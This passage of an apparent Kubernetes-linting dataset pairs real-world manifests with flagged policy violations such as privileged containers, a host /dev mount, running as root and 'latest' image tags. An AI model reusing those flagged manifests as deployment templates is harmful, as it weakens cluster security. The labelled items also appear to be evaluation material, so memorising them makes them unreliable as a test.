name: PL_POSTGRES_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: pl-db-secrets\n              key: PL_POSTGRES_USERNAME\n        - name: PL_POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: pl-db-secrets\n              key: PL_POSTGRES_PASSWORD\n        - name: PL_VIZIER_VERSION\n          value: ''\n        - name: PL_CLI_VERSION\n          value: ''\n        volumeMounts:\n        - name: certs\n          mountPath: /certs\n        - name: artifact-access-sa\n          mountPath: /creds\n          readOnly: true\n      volumes:\n      - name: certs\n        secret:\n          secretName: service-tls-certs\n      - name: artifact-access-sa\n        secret:\n          secretName: artifact-access-sa\n          optional: true\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"artifact-tracker-server\" is not set to runAsNonRoot"
  },
  {
    "id": "2657",
    "manifest_path": "data/manifests/the_stack_sample/sample_0735.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: artifact-tracker-server\n  labels:\n    db: pgsql\nspec:\n  selector:\n    matchLabels:\n      name: artifact-tracker-server\n  template:\n    metadata:\n      labels:\n        name: artifact-tracker-server\n    spec:\n      containers:\n      - name: artifact-tracker-server\n        image: gcr.io/pl-dev-infra/cloud/artifact_tracker_server_image\n        ports:\n        - containerPort: 50750\n        readinessProbe:\n          httpGet:\n            scheme: HTTPS\n            path: /healthz\n            port: 50750\n        livenessProbe:\n          httpGet:\n            scheme: HTTPS\n            path: /healthz\n            port: 50750\n        envFrom:\n        - configMapRef:\n            name: pl-db-config\n        - configMapRef:\n            name: pl-tls-config\n        - configMapRef:\n            name: pl-artifact-config\n        - configMapRef:\n            name: pl-domain-config\n        env:\n        - name: PL_JWT_SIGNING_KEY\n          valueFrom:\n            secretKeyRef:\n              name: cloud-auth-secrets\n              key: jwt-signing-key\n        - name: PL_POSTGRES_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: pl-db-secrets\n              key: PL_POSTGRES_USERNAME\n        - name: PL_POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: pl-db-secrets\n              key: PL_POSTGRES_PASSWORD\n        - name: PL_VIZIER_VERSION\n          value: ''\n        - name: PL_CLI_VERSION\n          value: ''\n        volumeMounts:\n        - name: certs\n          mountPath: /certs\n        - name: artifact-access-sa\n          mountPath: /creds\n          readOnly: true\n      volumes:\n      - name: certs\n        secret:\n          secretName: service-tls-certs\n      - name: artifact-access-sa\n        secret:\n          secretName: artifact-access-sa\n          optional: true\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"artifact-tracker-server\" has cpu request 0"
  },
  {
    "id": "2658",
    "manifest_path": "data/manifests/the_stack_sample/sample_0735.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: artifact-tracker-server\n  labels:\n    db: pgsql\nspec:\n  selector:\n    matchLabels:\n      name: artifact-tracker-server\n  template:\n    metadata:\n      labels:\n        name: artifact-tracker-server\n    spec:\n      containers:\n      - name: artifact-tracker-server\n        image: gcr.io/pl-dev-infra/cloud/artifact_tracker_server_image\n        ports:\n        - containerPort: 50750\n        readinessProbe:\n          httpGet:\n            scheme: HTTPS\n            path: /healthz\n            port: 50750\n        livenessProbe:\n          httpGet:\n            scheme: HTTPS\n            path: /healthz\n            port: 50750\n        envFrom:\n        - configMapRef:\n            name: pl-db-config\n        - configMapRef:\n            name: pl-tls-config\n        - configMapRef:\n            name: pl-artifact-config\n        - configMapRef:\n            name: pl-domain-config\n        env:\n        - name: PL_JWT_SIGNING_KEY\n          valueFrom:\n            secretKeyRef:\n              name: cloud-auth-secrets\n              key: jwt-signing-key\n        - name: PL_POSTGRES_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: pl-db-secrets\n              key: PL_POSTGRES_USERNAME\n        - name: PL_POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: pl-db-secrets\n              key: PL_POSTGRES_PASSWORD\n        - name: PL_VIZIER_VERSION\n          value: ''\n        - name: PL_CLI_VERSION\n          value: ''\n        volumeMounts:\n        - name: certs\n          mountPath: /certs\n        - name: artifact-access-sa\n          mountPath: /creds\n          readOnly: true\n      volumes:\n      - name: certs\n        secret:\n          secretName: service-tls-certs\n      - name: artifact-access-sa\n        secret:\n          secretName: artifact-access-sa\n          optional: true\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"artifact-tracker-server\" has memory limit 0"
  },
  {
    "id": "2659",
    "manifest_path": "data/manifests/the_stack_sample/sample_0738.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: eventsource-controller\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: eventsource-controller\n  template:\n    metadata:\n      labels:\n        app: eventsource-controller\n    spec:\n      serviceAccountName: argo-events-sa\n      securityContext:\n        runAsNonRoot: true\n        runAsUser: 9731\n      containers:\n      - name: eventsource-controller\n        image: quay.io/argoproj/argo-events:latest\n        imagePullPolicy: Always\n        args:\n        - eventsource-controller\n        env:\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: EVENTSOURCE_IMAGE\n          value: quay.io/argoproj/argo-events:latest\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"eventsource-controller\" is using an invalid container image, \"quay.io/argoproj/argo-events:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2660",
    "manifest_path": "data/manifests/the_stack_sample/sample_0738.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: eventsource-controller\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: eventsource-controller\n  template:\n    metadata:\n      labels:\n        app: eventsource-controller\n    spec:\n      serviceAccountName: argo-events-sa\n      securityContext:\n        runAsNonRoot: true\n        runAsUser: 9731\n      containers:\n      - name: eventsource-controller\n        image: quay.io/argoproj/argo-events:latest\n        imagePullPolicy: Always\n        args:\n        - eventsource-controller\n        env:\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: EVENTSOURCE_IMAGE\n          value: quay.io/argoproj/argo-events:latest\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n",
    "policy_id": "liveness-port",
    "violation_text": "container \"eventsource-controller\" does not expose port 8081 for the HTTPGet"
  },
  {
    "id": "2661",
    "manifest_path": "data/manifests/the_stack_sample/sample_0738.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: eventsource-controller\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: eventsource-controller\n  template:\n    metadata:\n      labels:\n        app: eventsource-controller\n    spec:\n      serviceAccountName: argo-events-sa\n      securityContext:\n        runAsNonRoot: true\n        runAsUser: 9731\n      containers:\n      - name: eventsource-controller\n        image: quay.io/argoproj/argo-events:latest\n        imagePullPolicy: Always\n        args:\n        - eventsource-controller\n        env:\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: EVENTSOURCE_IMAGE\n          value: quay.io/argoproj/argo-events:latest\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"eventsource-controller\" does not have a read-only root file system"
  },
  {
    "id": "2662",
    "manifest_path": "data/manifests/the_stack_sample/sample_0738.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: eventsource-controller\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: eventsource-controller\n  template:\n    metadata:\n      labels:\n        app: eventsource-controller\n    spec:\n      serviceAccountName: argo-events-sa\n      securityContext:\n        runAsNonRoot: true\n        runAsUser: 9731\n      containers:\n      - name: eventsource-controller\n        image: quay.io/argoproj/argo-events:latest\n        imagePullPolicy: Always\n        args:\n        - eventsource-controller\n        env:\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: EVENTSOURCE_IMAGE\n          value: quay.io/argoproj/argo-events:latest\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"argo-events-sa\" not found"
  },
  {
    "id": "2663",
    "manifest_path": "data/manifests/the_stack_sample/sample_0738.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: eventsource-controller\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: eventsource-controller\n  template:\n    metadata:\n      labels:\n        app: eventsource-controller\n    spec:\n      serviceAccountName: argo-events-sa\n      securityContext:\n        runAsNonRoot: true\n        runAsUser: 9731\n      containers:\n      - name: eventsource-controller\n        image: quay.io/argoproj/argo-events:latest\n        imagePullPolicy: Always\n        args:\n        - eventsource-controller\n        env:\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: EVENTSOURCE_IMAGE\n          value: quay.io/argoproj/argo-events:latest\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n",
    "policy_id": "readiness-port",
    "violation_text": "container \"eventsource-controller\" does not expose port 8081 for the HTTPGet"
  },
  {
    "id": "2664",
    "manifest_path": "data/manifests/the_stack_sample/sample_0738.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: eventsource-controller\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: eventsource-controller\n  template:\n    metadata:\n      labels:\n        app: eventsource-controller\n    spec:\n      serviceAccountName: argo-events-sa\n      securityContext:\n        runAsNonRoot: true\n        runAsUser: 9731\n      containers:\n      - name: eventsource-controller\n        image: quay.io/argoproj/argo-events:latest\n        imagePullPolicy: Always\n        args:\n        - eventsource-controller\n        env:\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: EVENTSOURCE_IMAGE\n          value: quay.io/argoproj/argo-events:latest\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"eventsource-controller\" has cpu request 0"
  },
  {
    "id": "2665",
    "manifest_path": "data/manifests/the_stack_sample/sample_0738.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: eventsource-controller\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: eventsource-controller\n  template:\n    metadata:\n      labels:\n        app: eventsource-controller\n    spec:\n      serviceAccountName: argo-events-sa\n      securityContext:\n        runAsNonRoot: true\n        runAsUser: 9731\n      containers:\n      - name: eventsource-controller\n        image: quay.io/argoproj/argo-events:latest\n        imagePullPolicy: Always\n        args:\n        - eventsource-controller\n        env:\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: EVENTSOURCE_IMAGE\n          value: quay.io/argoproj/argo-events:latest\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"eventsource-controller\" has memory limit 0"
  },
  {
    "id": "2666",
    "manifest_path": "data/manifests/the_stack_sample/sample_0739.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: sample-app\n  name: sample-app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: sample-app\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: sample-app\n    spec:\n      containers:\n      - image: quay.io/mpeters/sample-app:latest\n        imagePullPolicy: Always\n        name: sample-app\n        ports:\n        - containerPort: 8080\n        env:\n        - name: NODE_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.hostIP\n        - name: POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"sample-app\" is using an invalid container image, \"quay.io/mpeters/sample-app:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2667",
    "manifest_path": "data/manifests/the_stack_sample/sample_0739.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: sample-app\n  name: sample-app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: sample-app\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: sample-app\n    spec:\n      containers:\n      - image: quay.io/mpeters/sample-app:latest\n        imagePullPolicy: Always\n        name: sample-app\n        ports:\n        - containerPort: 8080\n        env:\n        - name: NODE_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.hostIP\n        - name: POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"sample-app\" does not have a read-only root file system"
  },
  {
    "id": "2668",
    "manifest_path": "data/manifests/the_stack_sample/sample_0739.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: sample-app\n  name: sample-app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: sample-app\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: sample-app\n    spec:\n      containers:\n      - image: quay.io/mpeters/sample-app:latest\n        imagePullPolicy: Always\n        name: sample-app\n        ports:\n        - containerPort: 8080\n        env:\n        - name: NODE_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.hostIP\n        - name: POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"sample-app\" is not set to runAsNonRoot"
  },
  {
    "id": "2669",
    "manifest_path": "data/manifests/the_stack_sample/sample_0739.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: sample-app\n  name: sample-app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: sample-app\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: sample-app\n    spec:\n      containers:\n      - image: quay.io/mpeters/sample-app:latest\n        imagePullPolicy: Always\n        name: sample-app\n        ports:\n        - containerPort: 8080\n        env:\n        - name: NODE_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.hostIP\n        - name: POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"sample-app\" has cpu request 0"
  },
  {
    "id": "2670",
    "manifest_path": "data/manifests/the_stack_sample/sample_0739.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: sample-app\n  name: sample-app\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: sample-app\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: sample-app\n    spec:\n      containers:\n      - image: quay.io/mpeters/sample-app:latest\n        imagePullPolicy: Always\n        name: sample-app\n        ports:\n        - containerPort: 8080\n        env:\n        - name: NODE_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.hostIP\n        - name: POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"sample-app\" has memory limit 0"
  },
  {
    "id": "2671",
    "manifest_path": "data/manifests/the_stack_sample/sample_0740.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    app.kubernetes.io/component: adaptor\n  name: adaptor\n  namespace: system\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: adaptor\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: adaptor\n    spec:\n      containers:\n      - name: octopus\n        image: cnrancher/octopus-adaptor-modbus:master\n        volumeMounts:\n        - mountPath: /var/lib/octopus/adaptors/\n          name: sockets\n        - mountPath: /dev\n          name: dev\n        securityContext:\n          privileged: true\n      volumes:\n      - name: sockets\n        hostPath:\n          path: /var/lib/octopus/adaptors/\n          type: DirectoryOrCreate\n      - name: dev\n        hostPath:\n          path: /dev\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"octopus\" does not have a read-only root file system"
  },
  {
    "id": "2672",
    "manifest_path": "data/manifests/the_stack_sample/sample_0740.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    app.kubernetes.io/component: adaptor\n  name: adaptor\n  namespace: system\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: adaptor\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: adaptor\n    spec:\n      containers:\n      - name: octopus\n        image: cnrancher/octopus-adaptor-modbus:master\n        volumeMounts:\n        - mountPath: /var/lib/octopus/adaptors/\n          name: sockets\n        - mountPath: /dev\n          name: dev\n        securityContext:\n          privileged: true\n      volumes:\n      - name: sockets\n        hostPath:\n          path: /var/lib/octopus/adaptors/\n          type: DirectoryOrCreate\n      - name: dev\n        hostPath:\n          path: /dev\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"octopus\" is Privileged hence allows privilege escalation."
  },
  {
    "id": "2673",
    "manifest_path": "data/manifests/the_stack_sample/sample_0740.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    app.kubernetes.io/component: adaptor\n  name: adaptor\n  namespace: system\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: adaptor\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: adaptor\n    spec:\n      containers:\n      - name: octopus\n        image: cnrancher/octopus-adaptor-modbus:master\n        volumeMounts:\n        - mountPath: /var/lib/octopus/adaptors/\n          name: sockets\n        - mountPath: /dev\n          name: dev\n        securityContext:\n          privileged: true\n      volumes:\n      - name: sockets\n        hostPath:\n          path: /var/lib/octopus/adaptors/\n          type: DirectoryOrCreate\n      - name: dev\n        hostPath:\n          path: /dev\n",
    "policy_id": "privileged-container",
    "violation_text": "container \"octopus\" is privileged"
  },
  {
    "id": "2674",
    "manifest_path": "data/manifests/the_stack_sample/sample_0740.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    app.kubernetes.io/component: adaptor\n  name: adaptor\n  namespace: system\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: adaptor\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: adaptor\n    spec:\n      containers:\n      - name: octopus\n        image: cnrancher/octopus-adaptor-modbus:master\n        volumeMounts:\n        - mountPath: /var/lib/octopus/adaptors/\n          name: sockets\n        - mountPath: /dev\n          name: dev\n        securityContext:\n          privileged: true\n      volumes:\n      - name: sockets\n        hostPath:\n          path: /var/lib/octopus/adaptors/\n          type: DirectoryOrCreate\n      - name: dev\n        hostPath:\n          path: /dev\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"octopus\" is not set to runAsNonRoot"
  },
  {
    "id": "2675",
    "manifest_path": "data/manifests/the_stack_sample/sample_0740.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    app.kubernetes.io/component: adaptor\n  name: adaptor\n  namespace: system\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: adaptor\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: adaptor\n    spec:\n      containers:\n      - name: octopus\n        image: cnrancher/octopus-adaptor-modbus:master\n        volumeMounts:\n        - mountPath: /var/lib/octopus/adaptors/\n          name: sockets\n        - mountPath: /dev\n          name: dev\n        securityContext:\n          privileged: true\n      volumes:\n      - name: sockets\n        hostPath:\n          path: /var/lib/octopus/adaptors/\n          type: DirectoryOrCreate\n      - name: dev\n        hostPath:\n          path: /dev\n",
    "policy_id": "sensitive-host-mounts",
    "violation_text": "host system directory \"/dev\" is mounted on container \"octopus\""
  },
  {
    "id": "2676",
    "manifest_path": "data/manifests/the_stack_sample/sample_0740.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    app.kubernetes.io/component: adaptor\n  name: adaptor\n  namespace: system\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: adaptor\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: adaptor\n    spec:\n      containers:\n      - name: octopus\n        image: cnrancher/octopus-adaptor-modbus:master\n        volumeMounts:\n        - mountPath: /var/lib/octopus/adaptors/\n          name: sockets\n        - mountPath: /dev\n          name: dev\n        securityContext:\n          privileged: true\n      volumes:\n      - name: sockets\n        hostPath:\n          path: /var/lib/octopus/adaptors/\n          type: DirectoryOrCreate\n      - name: dev\n        hostPath:\n          path: /dev\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"octopus\" has cpu request 0"
  },
  {
    "id": "2677",
    "manifest_path": "data/manifests/the_stack_sample/sample_0740.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    app.kubernetes.io/component: adaptor\n  name: adaptor\n  namespace: system\nspec:\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: adaptor\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: adaptor\n    spec:\n      containers:\n      - name: octopus\n        image: cnrancher/octopus-adaptor-modbus:master\n        volumeMounts:\n        - mountPath: /var/lib/octopus/adaptors/\n          name: sockets\n        - mountPath: /dev\n          name: dev\n        securityContext:\n          privileged: true\n      volumes:\n      - name: sockets\n        hostPath:\n          path: /var/lib/octopus/adaptors/\n          type: DirectoryOrCreate\n      - name: dev\n        hostPath:\n          path: /dev\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"octopus\" has memory limit 0"
  },
  {
    "id": "2678",
    "manifest_path": "data/manifests/the_stack_sample/sample_0742.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: cron-composites-lib-unb-ca\n  namespace: dev\n  labels:\n    app: drupal\n    tier: cron\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: cron-composites-lib-unb-ca\n          command:\n          - /scripts/drupalCronEntry.sh\n          env:\n          - name: DEPLOY_ENV\n            value: dev\n          - name: MYSQL_HOSTNAME\n            value: drupal-mysql-lib-unb-ca\n          - name: MYSQL_PORT\n            value: '3306'\n          image: '||DEPLOYMENTIMAGE||'\n          imagePullPolicy: Always\n          volumeMounts:\n          - mountPath: /app/html/sites/default\n            name: drupal-persistent-storage\n        volumes:\n        - name: drupal-persistent-storage\n          persistentVolumeClaim:\n            claimName: composites-lib-unb-ca\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"cron-composites-lib-unb-ca\" is using an invalid container image, \"||DEPLOYMENTIMAGE||\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2679",
    "manifest_path": "data/manifests/the_stack_sample/sample_0742.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: cron-composites-lib-unb-ca\n  namespace: dev\n  labels:\n    app: drupal\n    tier: cron\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: cron-composites-lib-unb-ca\n          command:\n          - /scripts/drupalCronEntry.sh\n          env:\n          - name: DEPLOY_ENV\n            value: dev\n          - name: MYSQL_HOSTNAME\n            value: drupal-mysql-lib-unb-ca\n          - name: MYSQL_PORT\n            value: '3306'\n          image: '||DEPLOYMENTIMAGE||'\n          imagePullPolicy: Always\n          volumeMounts:\n          - mountPath: /app/html/sites/default\n            name: drupal-persistent-storage\n        volumes:\n        - name: drupal-persistent-storage\n          persistentVolumeClaim:\n            claimName: composites-lib-unb-ca\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cron-composites-lib-unb-ca\" does not have a read-only root file system"
  },
  {
    "id": "2680",
    "manifest_path": "data/manifests/the_stack_sample/sample_0742.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: cron-composites-lib-unb-ca\n  namespace: dev\n  labels:\n    app: drupal\n    tier: cron\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: cron-composites-lib-unb-ca\n          command:\n          - /scripts/drupalCronEntry.sh\n          env:\n          - name: DEPLOY_ENV\n            value: dev\n          - name: MYSQL_HOSTNAME\n            value: drupal-mysql-lib-unb-ca\n          - name: MYSQL_PORT\n            value: '3306'\n          image: '||DEPLOYMENTIMAGE||'\n          imagePullPolicy: Always\n          volumeMounts:\n          - mountPath: /app/html/sites/default\n            name: drupal-persistent-storage\n        volumes:\n        - name: drupal-persistent-storage\n          persistentVolumeClaim:\n            claimName: composites-lib-unb-ca\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cron-composites-lib-unb-ca\" is not set to runAsNonRoot"
  },
  {
    "id": "2681",
    "manifest_path": "data/manifests/the_stack_sample/sample_0742.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: cron-composites-lib-unb-ca\n  namespace: dev\n  labels:\n    app: drupal\n    tier: cron\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: cron-composites-lib-unb-ca\n          command:\n          - /scripts/drupalCronEntry.sh\n          env:\n          - name: DEPLOY_ENV\n            value: dev\n          - name: MYSQL_HOSTNAME\n            value: drupal-mysql-lib-unb-ca\n          - name: MYSQL_PORT\n            value: '3306'\n          image: '||DEPLOYMENTIMAGE||'\n          imagePullPolicy: Always\n          volumeMounts:\n          - mountPath: /app/html/sites/default\n            name: drupal-persistent-storage\n        volumes:\n        - name: drupal-persistent-storage\n          persistentVolumeClaim:\n            claimName: composites-lib-unb-ca\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"cron-composites-lib-unb-ca\" has cpu request 0"
  },
  {
    "id": "2682",
    "manifest_path": "data/manifests/the_stack_sample/sample_0742.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: cron-composites-lib-unb-ca\n  namespace: dev\n  labels:\n    app: drupal\n    tier: cron\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - name: cron-composites-lib-unb-ca\n          command:\n          - /scripts/drupalCronEntry.sh\n          env:\n          - name: DEPLOY_ENV\n            value: dev\n          - name: MYSQL_HOSTNAME\n            value: drupal-mysql-lib-unb-ca\n          - name: MYSQL_PORT\n            value: '3306'\n          image: '||DEPLOYMENTIMAGE||'\n          imagePullPolicy: Always\n          volumeMounts:\n          - mountPath: /app/html/sites/default\n            name: drupal-persistent-storage\n        volumes:\n        - name: drupal-persistent-storage\n          persistentVolumeClaim:\n            claimName: composites-lib-unb-ca\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"cron-composites-lib-unb-ca\" has memory limit 0"
  },
  {
    "id": "2683",
    "manifest_path": "data/manifests/the_stack_sample/sample_0744.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: voting-service\n  labels:\n    app: demo-voting-app\nspec:\n  ports:\n  - port: 80\n    targetPort: 80\n  selector:\n    app: demo-voting-app\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:demo-voting-app])"
  },
  {
    "id": "2684",
    "manifest_path": "data/manifests/the_stack_sample/sample_0747.yaml",
